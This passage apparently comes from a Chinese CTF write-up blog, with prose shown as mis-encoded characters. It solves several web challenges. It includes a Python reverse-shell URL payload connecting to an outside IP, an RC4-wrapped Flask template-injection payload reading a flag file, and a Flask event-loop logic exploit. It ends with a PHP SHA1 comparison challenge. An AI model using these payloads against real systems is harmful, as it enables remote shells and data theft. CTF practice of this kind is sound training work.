<p>é¦–å…ˆè‚¯å®šæ˜¯æƒ³åˆ°åå¼¹ä¸€ä¸ªshellï¼Œç”¨BUUå°å·å¼€ä¸€ä¸ªLinuxä¸»æœºï¼Œå°è¯•æœ‰bashã€curlã€ncã€python -cç­‰ï¼Œä½†æ˜¯è¿™é‡Œæµ‹è¯•åå‘ç°è¿™äº›å¸¸ç”¨çš„å‘½ä»¤éƒ½è¢«ç¦äº†ï¼Œæ— æ³•åå¼¹Shellã€‚æœ€åå†æ¢æˆpython3å°±å¯ä»¥æˆåŠŸåå¼¹shellï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;bc5fa49b-316a-47e1-8737-20050c013abe.node3.buuoj.cn&#x2F;shell?c&#x3D;python3%20-c%20%27import%20socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22174.2.25.118%22,4444));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p&#x3D;subprocess.call([%22&#x2F;bin&#x2F;sh%22,%22-i%22]);%27</span><br></pre></td></tr></table></figure>
<p>æ¥ä¸‹æ¥çš„ä¸€ä¸ªè€ƒç‚¹å°±æ˜¯é€šè¿‡æ–‡ä»¶æè¿°ç¬¦æ¥æ¢å¤æ–‡ä»¶ã€‚</p>
<blockquote>
<p>ä»€ä¹ˆæ˜¯æ–‡ä»¶æè¿°ç¬¦</p>
<p>ä¾‹å¦‚Pythonä¸­ï¼Œå½“æˆ‘ä»¬open()å‡½æ•°æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶æ—¶ä¾¿åˆ›å»ºäº†ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦ï¼Œè€Œåå¯¹è¿™ä¸ªæ–‡ä»¶æè¿°ç¬¦ä½¿ç”¨read()å‡½æ•°ä¾¿æ˜¯è¯»å–æ–‡ä»¶æè¿°ç¬¦ä¸­çš„å†…å®¹ï¼Œclose()å‡½æ•°ç”¨äºå…³é—­/é”€æ¯è¿™ä¸ªæ–‡ä»¶æè¿°ç¬¦ã€‚</p>
<p>æ–‡ä»¶æè¿°ç¬¦å‚¨å­˜åœ¨ä»€ä¹ˆåœ°æ–¹ï¼š</p>
<p><code>/proc/&lt;pid&gt;/fd/&lt;id&gt;</code></p>
</blockquote>
<p>æŸ¥çœ‹<code>/proc</code>ç›®å½•ä¸‹çš„è¿›ç¨‹å·</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200708102353.png" alt=""></p>
<p>æŸ¥çœ‹è¿›ç¨‹å·ç­‰äº10ä¸‹é¢çš„fdç›®å½•</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200708102509.png" alt=""></p>
<p>æ–‡ä»¶æè¿°ç¬¦ç­‰äº3å³ä¸ºflagæ–‡ä»¶</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200708102615.png" alt=""></p>
<h2 id="CISCN2019-åä¸œå—èµ›åŒº-Double-Secret">CISCN2019 åä¸œå—èµ›åŒº Double Secret</h2>
<h3 id="è€ƒç‚¹-v9">è€ƒç‚¹</h3>
<ul>
<li>æ¨¡æ¿æ³¨å…¥</li>
<li>RC4åŠ å¯†</li>
</ul>
<h3 id="è§£é¢˜-v9">è§£é¢˜</h3>
<p>æ‰«ç›®å½•å¾—åˆ°secretï¼Œè®¿é—®æç¤ºè¦æœ‰secretå‚æ•°ï¼ŒFuzzä¸€ä¸‹å‘ç°æŠ¥é”™</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">File &quot;&#x2F;app&#x2F;app.py&quot;, line 35, in secret</span><br><span class="line">    if(secret&#x3D;&#x3D;None):</span><br><span class="line">        return &#39;Tell me your secret.I will encrypt it so others can\&#39;t see&#39;</span><br><span class="line">    rc&#x3D;rc4_Modified.RC4(&quot;HereIsTreasure&quot;)   #è§£å¯†</span><br><span class="line">    deS&#x3D;rc.do_crypt(secret)</span><br><span class="line">    a&#x3D;render_template_string(safe(deS))</span><br><span class="line">    if &#39;ciscn&#39; in a.lower():</span><br><span class="line">        return &#39;flag detected!&#39;</span><br><span class="line">      return a</span><br></pre></td></tr></table></figure>
<p>å¦‚æœä½ ä¼ å…¥äº†å‚æ•°ï¼Œé‚£ä¹ˆå®ƒå°±ä¼šè¿›è¡ŒåŠ å¯†ï¼Œå¯ä»¥çœ‹åˆ°æ˜¯RC4åŠ å¯†ï¼Œè€Œä¸”è¿˜æ³„éœ²äº†å¯†é’¥ï¼Œå¯†é’¥å°±æ˜¯â€œHereIsTreasureâ€ï¼Œè€Œä¸”é€šè¿‡æŠ¥é”™ï¼Œæˆ‘ä»¬äº†è§£åˆ°è¿™æ˜¯flaskçš„æ¨¡æ¿ï¼Œè€Œä¸”pythonçš„ç‰ˆæœ¬æ˜¯2.7çš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥åˆ©ç”¨flaskçš„æ¨¡æ¿æ³¨å…¥ï¼Œæ‰§è¡Œå‘½ä»¤ï¼Œåªä¸è¿‡éœ€è¦è¿›è¡ŒRC4åŠ å¯†ã€‚</p>
<p>RC4åŠ å¯†è„šæœ¬ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc4_main</span>(<span class="params">key = <span class="string">&quot;init_key&quot;</span>, message = <span class="string">&quot;init_message&quot;</span></span>):</span></span><br><span class="line">    <span class="comment"># print(&quot;RC4åŠ å¯†ä¸»å‡½æ•°&quot;)</span></span><br><span class="line">    s_box = rc4_init_sbox(key)</span><br><span class="line">    crypt = str(rc4_excrypt(message, s_box))</span><br><span class="line">    <span class="keyword">return</span>  crypt</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc4_init_sbox</span>(<span class="params">key</span>):</span></span><br><span class="line">    s_box = list(range(<span class="number">256</span>))</span><br><span class="line">    <span class="comment"># print(&quot;åŸæ¥çš„ s ç›’ï¼š%s&quot; % s_box)</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">        j = (j + s_box[i] + ord(key[i % len(key)])) % <span class="number">256</span></span><br><span class="line">        s_box[i], s_box[j] = s_box[j], s_box[i]</span><br><span class="line">    <span class="comment"># print(&quot;æ··ä¹±åçš„ s ç›’ï¼š%s&quot;% s_box)</span></span><br><span class="line">    <span class="keyword">return</span> s_box</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc4_excrypt</span>(<span class="params">plain, box</span>):</span></span><br><span class="line">    <span class="comment"># print(&quot;è°ƒç”¨åŠ å¯†ç¨‹åºæˆåŠŸã€‚&quot;)</span></span><br><span class="line">    res = []</span><br><span class="line">    i = j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> plain:</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + box[i]) % <span class="number">256</span></span><br><span class="line">        box[i], box[j] = box[j], box[i]</span><br><span class="line">        t = (box[i] + box[j]) % <span class="number">256</span></span><br><span class="line">        k = box[t]</span><br><span class="line">        res.append(chr(ord(s) ^ k))</span><br><span class="line">    cipher = <span class="string">&quot;&quot;</span>.join(res)</span><br><span class="line">    print(<span class="string">&quot;åŠ å¯†åçš„å­—ç¬¦ä¸²æ˜¯ï¼š%s&quot;</span> %quote(cipher))</span><br><span class="line">    <span class="keyword">return</span> (str(base64.b64encode(cipher.encode(<span class="string">&#x27;utf-8&#x27;</span>)), <span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">rc4_main(<span class="string">&quot;HereIsTreasure&quot;</span>,<span class="string">&quot;&#123;&#123;&#x27;&#x27;.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)(&#x27;/flag.txt&#x27;).read()&#125;&#125;&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>å¾—åˆ°åŠ å¯†åçš„payloadåä¼ å…¥ï¼Œæ‹¿åˆ°flagã€‚</p>
<h2 id="GXYCTF2019-Strongest-Mind">GXYCTF2019 Strongest Mind</h2>
<h3 id="è€ƒç‚¹-v10">è€ƒç‚¹</h3>
<ul>
<li>Pythonè„šæœ¬</li>
</ul>
<h3 id="è§£é¢˜-v10">è§£é¢˜</h3>
<p>æ³¨æ„Sessionçš„ä½¿ç”¨</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://7a9216ad-bfec-45c5-a89e-71e8190e8299.node3.buuoj.cn/&quot;</span></span><br><span class="line">s = requests.session()</span><br><span class="line">a = s.get(url)</span><br><span class="line">pattern = re.findall(<span class="string">r&#x27;\d+.[+-].\d+&#x27;</span>, a.text)</span><br><span class="line">c = eval(pattern[<span class="number">0</span>])</span><br><span class="line">a = s.post(url, data=&#123;<span class="string">&quot;answer&quot;</span>: c&#125;)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1000</span>):</span><br><span class="line">    time.sleep(<span class="number">0.1</span>)</span><br><span class="line">    pattern = re.findall(<span class="string">r&#x27;\d+.[+-].\d+&#x27;</span>, a.text)</span><br><span class="line">    c = eval(pattern[<span class="number">0</span>])</span><br><span class="line">    print(c)</span><br><span class="line">    a = s.post(url, data=&#123;<span class="string">&quot;answer&quot;</span>: c&#125;)</span><br><span class="line">print(a.content)</span><br></pre></td></tr></table></figure>
<h2 id="DDCTF2019-homebrew-event-loop">DDCTF2019 homebrew event loop</h2>
<h3 id="è€ƒç‚¹-v11">è€ƒç‚¹</h3>
<ul>
<li>é€»è¾‘æ¼æ´</li>
<li>flask session</li>
</ul>
<h3 id="è§£é¢˜-v11">è§£é¢˜</h3>
<p>è¯¦ç»†wpï¼š<a href="https://blog.cindemor.com/post/ctf-web-16.html">https://blog.cindemor.com/post/ctf-web-16.html</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, session, request, Response</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = <span class="string">&#x27;*********************&#x27;</span>  <span class="comment"># censored</span></span><br><span class="line">url_prefix = <span class="string">&#x27;/d5afe1f66147e857&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">FLAG</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;*********************&#x27;</span>  <span class="comment"># censored</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">trigger_event</span>(<span class="params">event</span>):</span></span><br><span class="line">	<span class="comment"># event = [&#x27;action:buy;5&#x27;, &#x27;action:get_flag;&#x27;]</span></span><br><span class="line">    session[<span class="string">&#x27;log&#x27;</span>].append(event)</span><br><span class="line">    <span class="keyword">if</span> len(session[<span class="string">&#x27;log&#x27;</span>]) &gt; <span class="number">5</span>:</span><br><span class="line">        session[<span class="string">&#x27;log&#x27;</span>] = session[<span class="string">&#x27;log&#x27;</span>][<span class="number">-5</span>:]</span><br><span class="line">    <span class="keyword">if</span> type(event) == type([]):</span><br><span class="line">        request.event_queue += event</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        request.event_queue.append(event)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_mid_str</span>(<span class="params">haystack, prefix, postfix=None</span>):</span></span><br><span class="line">	<span class="comment"># haystack = action:trigger_event%23;action:buy;5%23action:get_flag;</span></span><br><span class="line">	<span class="comment"># prefix = trigger_event%23;</span></span><br><span class="line">    haystack = haystack[haystack.find(prefix)+len(prefix):]</span><br><span class="line">    <span class="keyword">if</span> postfix <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        haystack = haystack[:haystack.find(postfix)]</span><br><span class="line">    <span class="keyword">return</span> haystack</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RollBackException</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">execute_event_loop</span>():</span></span><br><span class="line">    valid_event_chars = set(</span><br><span class="line">        <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789:;#&#x27;</span>)</span><br><span class="line">    resp = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">while</span> len(request.event_queue) &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="comment"># `event` is something like &quot;action:ACTION;ARGS0#ARGS1#ARGS2......&quot;</span></span><br><span class="line">        event = request.event_queue[<span class="number">0</span>]</span><br><span class="line">        request.event_queue = request.event_queue[<span class="number">1</span>:]</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> event.startswith((<span class="string">&#x27;action:&#x27;</span>, <span class="string">&#x27;func:&#x27;</span>)):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> event:</span><br><span class="line">            <span class="keyword">if</span> c <span class="keyword">not</span> <span class="keyword">in</span> valid_event_chars:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">        	<span class="comment"># event = action:trigger_event%23;action:buy;5%23action:get_flag;</span></span><br><span class="line">            is_action = event[<span class="number">0</span>] == <span class="string">&#x27;a&#x27;</span></span><br><span class="line">            <span class="comment"># action = trigger_event%23</span></span><br><span class="line">            action = get_mid_str(event, <span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;;&#x27;</span>)</span><br><span class="line">            <span class="comment"># args = [&#x27;action:buy;5&#x27;, &#x27;action:get_flag;&#x27;]</span></span><br><span class="line">            args = get_mid_str(event, action+<span class="string">&#x27;;&#x27;</span>).split(<span class="string">&#x27;#&#x27;</span>)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                event_handler = eval(</span><br><span class="line">                	<span class="comment"># event_handler = trigger_event#_handler</span></span><br><span class="line">                    action + (<span class="string">&#x27;_handler&#x27;</span> <span class="keyword">if</span> is_action <span class="keyword">else</span> <span class="string">&#x27;_function&#x27;</span>))</span><br><span class="line">                <span class="comment"># ret_val = trigger_event([&#x27;action:buy;5&#x27;, &#x27;action:get_flag;&#x27;])</span></span><br><span class="line">                ret_val = event_handler(args)</span><br><span class="line">            <span class="keyword">except</span> RollBackException:</span><br><span class="line">                <span class="keyword">if</span> resp <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                    resp = <span class="string">&#x27;&#x27;</span></span><br><span class="line">                resp += <span class="string">&#x27;ERROR! All transactions have been cancelled. &lt;br /&gt;&#x27;</span></span><br><span class="line">                resp += <span class="string">&#x27;&lt;a href=&quot;./?action:view;index&quot;&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;&#x27;</span></span><br><span class="line">                session[<span class="string">&#x27;num_items&#x27;</span>] = request.prev_session[<span class="string">&#x27;num_items&#x27;</span>]</span><br><span class="line">                session[<span class="string">&#x27;points&#x27;</span>] = request.prev_session[<span class="string">&#x27;points&#x27;</span>]</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span> Exception, e:</span><br><span class="line">                <span class="keyword">if</span> resp <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                    resp = <span class="string">&#x27;&#x27;</span></span><br><span class="line">                <span class="comment"># resp += str(e) # only for debugging</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span> ret_val <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                <span class="keyword">if</span> resp <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                    resp = ret_val</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    resp += ret_val</span><br><span class="line">    <span class="keyword">if</span> resp <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> resp == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        resp = (<span class="string">&#x27;404 NOT FOUND&#x27;</span>, <span class="number">404</span>)</span><br><span class="line">    session.modified = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(url_prefix+&#x27;/&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">entry_point</span>():</span></span><br><span class="line">    querystring = urllib.unquote(request.query_string)</span><br><span class="line">    request.event_queue = []</span><br><span class="line">    <span class="keyword">if</span> querystring == <span class="string">&#x27;&#x27;</span> <span class="keyword">or</span> (<span class="keyword">not</span> querystring.startswith(<span class="string">&#x27;action:&#x27;</span>)) <span class="keyword">or</span> len(querystring) &gt; <span class="number">100</span>:</span><br><span class="line">        querystring = <span class="string">&#x27;action:index;False#False&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;num_items&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> session:</span><br><span class="line">        session[<span class="string">&#x27;num_items&#x27;</span>] = <span class="number">0</span></span><br><span class="line">        session[<span class="string">&#x27;points&#x27;</span>] = <span class="number">3</span></span><br><span class="line">        session[<span class="string">&#x27;log&#x27;</span>] = []</span><br><span class="line">    request.prev_session = dict(session)</span><br><span class="line">    trigger_event(querystring)</span><br><span class="line">    <span class="keyword">return</span> execute_event_loop()</span><br><span class="line"></span><br><span class="line"><span class="comment"># handlers/functions below --------------------------------------</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">view_handler</span>(<span class="params">args</span>):</span></span><br><span class="line">    page = args[<span class="number">0</span>]</span><br><span class="line">    html = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    html += <span class="string">&#x27;[INFO] you have &#123;&#125; diamonds, &#123;&#125; points now.&lt;br /&gt;&#x27;</span>.format(</span><br><span class="line">        session[<span class="string">&#x27;num_items&#x27;</span>], session[<span class="string">&#x27;points&#x27;</span>])</span><br><span class="line">    <span class="keyword">if</span> page == <span class="string">&#x27;index&#x27;</span>:</span><br><span class="line">        html += <span class="string">&#x27;&lt;a href=&quot;./?action:index;True%23False&quot;&gt;View source code&lt;/a&gt;&lt;br /&gt;&#x27;</span></span><br><span class="line">        html += <span class="string">&#x27;&lt;a href=&quot;./?action:view;shop&quot;&gt;Go to e-shop&lt;/a&gt;&lt;br /&gt;&#x27;</span></span><br><span class="line">        html += <span class="string">&#x27;&lt;a href=&quot;./?action:view;reset&quot;&gt;Reset&lt;/a&gt;&lt;br /&gt;&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> page == <span class="string">&#x27;shop&#x27;</span>:</span><br><span class="line">        html += <span class="string">&#x27;&lt;a href=&quot;./?action:buy;1&quot;&gt;Buy a diamond (1 point)&lt;/a&gt;&lt;br /&gt;&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> page == <span class="string">&#x27;reset&#x27;</span>:</span><br><span class="line">        <span class="keyword">del</span> session[<span class="string">&#x27;num_items&#x27;</span>]</span><br><span class="line">        html += <span class="string">&#x27;Session reset.&lt;br /&gt;&#x27;</span></span><br><span class="line">    html += <span class="string">&#x27;&lt;a href=&quot;./?action:view;index&quot;&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> html</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index_handler</span>(<span class="params">args</span>):</span></span><br><span class="line">    bool_show_source = str(args[<span class="number">0</span>])</span><br><span class="line">    bool_download_source = str(args[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">if</span> bool_show_source == <span class="string">&#x27;True&#x27;</span>:</span><br><span class="line"></span><br><span class="line">        source = open(<span class="string">&#x27;eventLoop.py&#x27;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">        html = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> bool_download_source != <span class="string">&#x27;True&#x27;</span>:</span><br><span class="line">            html += <span class="string">&#x27;&lt;a href=&quot;./?action:index;True%23True&quot;&gt;Download this .py file&lt;/a&gt;&lt;br /&gt;&#x27;</span></span><br><span class="line">            html += <span class="string">&#x27;&lt;a href=&quot;./?action:view;index&quot;&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> source:</span><br><span class="line">            <span class="keyword">if</span> bool_download_source != <span class="string">&#x27;True&#x27;</span>:</span><br><span class="line">                html += line.replace(<span class="string">&#x27;&amp;&#x27;</span>, <span class="string">&#x27;&amp;amp;&#x27;</span>).replace(<span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;&amp;nbsp;&#x27;</span>*<span class="number">4</span>).replace(</span><br><span class="line">                    <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;&amp;nbsp;&#x27;</span>).replace(<span class="string">&#x27;&lt;&#x27;</span>, <span class="string">&#x27;&amp;lt;&#x27;</span>).replace(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;&amp;gt;&#x27;</span>).replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&lt;br /&gt;&#x27;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                html += line</span><br><span class="line">        source.close()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> bool_download_source == <span class="string">&#x27;True&#x27;</span>:</span><br><span class="line">            headers = &#123;&#125;</span><br><span class="line">            headers[<span class="string">&#x27;Content-Type&#x27;</span>] = <span class="string">&#x27;text/plain&#x27;</span></span><br><span class="line">            headers[<span class="string">&#x27;Content-Disposition&#x27;</span>] = <span class="string">&#x27;attachment; filename=serve.py&#x27;</span></span><br><span class="line">            <span class="keyword">return</span> Response(html, headers=headers)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> html</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        trigger_event(<span class="string">&#x27;action:view;index&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">buy_handler</span>(<span class="params">args</span>):</span></span><br><span class="line">    num_items = int(args[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">if</span> num_items &lt;= <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;invalid number(&#123;&#125;) of diamonds to buy&lt;br /&gt;&#x27;</span>.format(args[<span class="number">0</span>])</span><br><span class="line">    session[<span class="string">&#x27;num_items&#x27;</span>] += num_items</span><br><span class="line">    trigger_event([<span class="string">&#x27;func:consume_point;&#123;&#125;&#x27;</span>.format(</span><br><span class="line">        num_items), <span class="string">&#x27;action:view;index&#x27;</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">consume_point_function</span>(<span class="params">args</span>):</span></span><br><span class="line">    point_to_consume = int(args[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">if</span> session[<span class="string">&#x27;points&#x27;</span>] &lt; point_to_consume:</span><br><span class="line">        <span class="keyword">raise</span> RollBackException()</span><br><span class="line">    session[<span class="string">&#x27;points&#x27;</span>] -= point_to_consume</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_flag_function</span>(<span class="params">args</span>):</span></span><br><span class="line">    flag = args[<span class="number">0</span>]</span><br><span class="line">    <span class="comment"># return flag # GOTCHA! We noticed that here is a backdoor planted by a hacker which will print the flag, so we disabled it.</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;You naughty boy! ;) &lt;br /&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_flag_handler</span>(<span class="params">args</span>):</span></span><br><span class="line">    <span class="keyword">if</span> session[<span class="string">&#x27;num_items&#x27;</span>] &gt;= <span class="number">5</span>:</span><br><span class="line">        <span class="comment"># show_flag_function has been disabled, no worries</span></span><br><span class="line">        trigger_event(<span class="string">&#x27;func:show_flag;&#x27;</span> + FLAG())</span><br><span class="line">    trigger_event(<span class="string">&#x27;action:view;index&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">False</span>, host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">action:trigger_event%23;action:buy;5%23action:get_flag;</span><br></pre></td></tr></table></figure>
<p>è¿›å…¥é˜Ÿåˆ—çš„é¡ºåºï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">action:trigger_event#;action:buy;5#action:get_flag;</span><br><span class="line">action:buy;5</span><br><span class="line">action:get_flag;</span><br><span class="line">func:consume_point;5</span><br><span class="line">action:view;index</span><br><span class="line">func:show_flag;&#96;FLAG()&#96;</span><br><span class="line">action:view;index</span><br></pre></td></tr></table></figure>
<p>æ—¥å¿—å†™å…¥çš„é¡ºåºï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">action:trigger_event#;action:buy;5#action:get_flag;</span><br><span class="line">[&#39;action:buy;5&#39;,&#39;action:get_flag;&#39;]</span><br><span class="line">[&#39;func:consume_point;5&#39;,&#39;action:view;index&#39;]</span><br><span class="line">func:show_flag;&#96;FLAG()&#96;</span><br><span class="line">action:view;index</span><br></pre></td></tr></table></figure>
<p>æ‹¿åˆ°flask sessionåè§£å¯†</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200917132800.png" alt=""></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>Python</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>CSICTF2020</title>
    <url>/Web_security/ctf_writeup/20.CSICTF2020/</url>
    <content><![CDATA[<h1 id="CSICTF2020-Web-Linux-Writeup">CSICTF2020 Web+Linux Writeup</h1>
<p>åœ¨ctfhubä¸Šé¢çœ‹åˆ°è¿™ä¸ªæ¯”èµ›ï¼Œä»‹ç»é‡Œé¢è¯´æ˜¯é¢å‘èŒæ–°çš„ï¼Œåšäº†ä¸€ä¸‹ï¼Œé¢˜ç›®ç¡®å®æ¯”è¾ƒå‹å¥½ï¼Œå¯ä»¥æ‹¿æ¥ç»ƒç»ƒæ‰‹ï¼Œè€Œä¸”åˆ°ç›®å‰ä¸ºæ­¢é¢˜ç›®ç¯å¢ƒè¿˜æ²¡æœ‰å…³é—­ã€‚å¾ˆç®€å•çš„é¢˜ç›®å°±è¯´ä¸€ä¸ªè€ƒç‚¹ç•¥è¿‡å»ã€‚ã€‚ã€‚ã€‚</p>
<blockquote>
<p><a href="https://ctf.csivit.com/challenges">https://ctf.csivit.com/challenges</a></p>
<p><a href="https://github.com/csivitu/ctf-challenges">https://github.com/csivitu/ctf-challenges</a></p>
</blockquote>
<h2 id="Web">Web</h2>
<h3 id="Warm-Up">Warm Up</h3>
<p><strong>è€ƒå¯ŸSHA1å¼±ç±»å‹æ¯”è¾ƒ</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;hash&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> ($_GET[<span class="string">&#x27;hash&#x27;</span>] === <span class="string">&quot;10932435112&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Not so easy mate.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $hash = sha1($_GET[<span class="string">&#x27;hash&#x27;</span>]);</span><br><span class="line">    $target = sha1(<span class="number">10932435112</span>);</span><br><span class="line">    <span class="keyword">if</span>($hash == $target) &#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">        <span class="keyword">print</span> $flag;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;csictf&#123;loser&#125;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="Cascade">Cascade</h3>
<p>F12ç›´æ¥NetworkæŸ¥çœ‹CSSæ–‡ä»¶ã€‚</p>
<h3 id="Oreo">Oreo</h3>
<p><strong>è€ƒå¯ŸCookie</strong></p>
